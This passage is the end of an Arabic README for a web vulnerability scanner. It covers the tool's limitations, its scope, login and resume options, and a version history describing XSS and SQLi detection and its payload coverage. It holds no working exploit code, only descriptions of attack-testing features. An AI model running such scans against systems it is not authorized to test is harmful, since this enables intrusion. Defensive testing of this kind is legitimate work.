  hidden CSRF. رابط الدخول يجب أن يكون داخل `--scope` عند استخدام ملف نطاق.
  OAuth وSSO وتسجيل الدخول المعتمد على JavaScript أو MFA يحتاج
  `--storage-state` أو HAR أو تسلسل متصفح مسجّل. بيانات الدخول لا تُكتب في
  التقارير أو history أو checkpoint؛ استخدم `SV1_PASSWORD` بدل `--password`
  حتى لا تظهر في قائمة العمليات.
- `--resume` يستكمل مرحلة النقاط فقط. مراحل browser/DOM وstored وblind
  وreplay تُعاد بعد إعادة التشغيل. وعاء الكوكيز لا يُحفظ في الملف، لكن نقاط
  الهيدرات وأوامر curl قد تحمل كوكيز، فالملف مواد جلسة لا ملف تقدّم. أكمل
  الفحص المسجّل بنفس خيارات `--login`.
- `--sitemap` يتبع ثلاثة ملفات same-origin ومستوى فهرس واحد. أرشيفات sitemap
  المضغوطة gzip لا تُفك؛ مرر الروابط مباشرة أو استخدم `--openapi`/`--request`.
- محرك async (`httpx`) ما زال مؤجلاً؛ المحرك الحالي thread pool محدود مع
  تكيّف rate limiting.
- `--scope` يحدد الفحص والتحويلات والتنقل العلوي في المتصفح. صفحات SPA قد
  تحمّل أصولاً خارجية أثناء العرض، لكن بدون هيدرات الجلسة وأي كوكي، بما فيها
  كوكي يضبطه الهدف؛ مو جدار شبكة كامل.
- `--retest` يعيد فحص XSS وSQLi error/boolean/time/second-order فقط. Blind،
  SSRF، Stored، DOM، وUNION تحتاج متصفحاً أو استخراجاً كاملاً فتُتخطى.
  الجلسة الأحدث لنفس `-u` هي المرجع.
- `--db` ما فيه تقليم تلقائي؛ احذف الملف أو أرشف الجلسات القديمة يدوياً.
- curl repro موجود منذ 1.2.0.

---

## الترخيص

MIT — راجع ملف `LICENSE`.

## الإصدار

`1.6.1` — الإصدار العام الحالي. إصلاح بوابة الإثبات لـCoverage 2.0: المختبر
الكامل يثبت XSS لمقطع المسار والهيدر والكوكي داخل Chromium
(`43/43`، 28 صفحة، 150 نقطة). `1.6.0` أضاف `--path` ونقاط الهيدر/الكوكي على
كل صفحة، ونطاقاً متعدد الأصول، وبصمة WAF سلبية، وتصنيف OWASP 2025. `1.5.2`
يغلق فجوتَي الاسترجاع في الـpayloads: `data:text/javascript` لـ`<script src>`
وevent handler بلا اقتباسات للـattribute العاري، ويصحح جدول الاسترجاع إلى
**43/43 صفحة GET**. `1.5.1` يصلّب ملفات
checkpoint بمود `0600`، ويحذر أن ملف `--resume` مادة جلسة، ويستثني
checkpoint/storage-state/resume JSON من Git، ويرفع أرضية التغطية إلى 51.0%،
ويضيف `/private` المحمي بالدخول و`/orphan` القادم من sitemap إلى دليل المختبر
الكامل. `1.5.0` يضيف الدخول من نموذج
same-origin، واستكمال مرحلة النقاط عبر checkpoint، وبذور robots/sitemap،
وتصنيف CWE/OWASP/الإصلاح، مع الحفاظ على مدخلات تطبيقات حقيقية: HAR وطلبات
HTTP خام، JSON وأجسام خام متداخلة، التقاط XHR/fetch POST، تحليل سكربتات
same-origin خارجية، وOpenAPI متداخل، وإصدارات مثبتة بدقة، `pyproject.toml`،
وبوابة CI تشغّل المختبر الكامل.
أضاف 1.3.3 فرض النطاق على كل redirect وعزل جلسة HTTP وChromium وفصل
`confirmed` عن `replayed`. أضاف 1.3.4 عزل كوكيز المتصفح حتى التي يضبطها الهدف،
وإعادة SQLi بخط أساس جديد، وتخفيض Blind الذي جلب سكربتاً فقط إلى `MEDIUM`،
ومحاولات بايلودات مخزنة متعددة. وأضاف 1.3.5 منع نقل جسم الطلب عبر الأصل،
وتطبيع مسارات النطاق وIPv6، ومزامنة كوكيز جلسة HTTP الحية مع Chromium. ويضيف
1.4.0 نقاط multipart وإثباتها، ومعاملات مسار OpenAPI، وتفعيل الحقول المخفية
وكلمات المرور صراحةً، وحالة تخزين محصورة بالهدف، وcurl واعياً بالجلسة.
الانعكاس وحده يبقى `MEDIUM`، وبوابة التغطية 51.0%.
تفاصيل التغييرات في `CHANGELOG.md`، ومراجعة السوق في
`docs/IMPROVEMENTS.ar.md`.
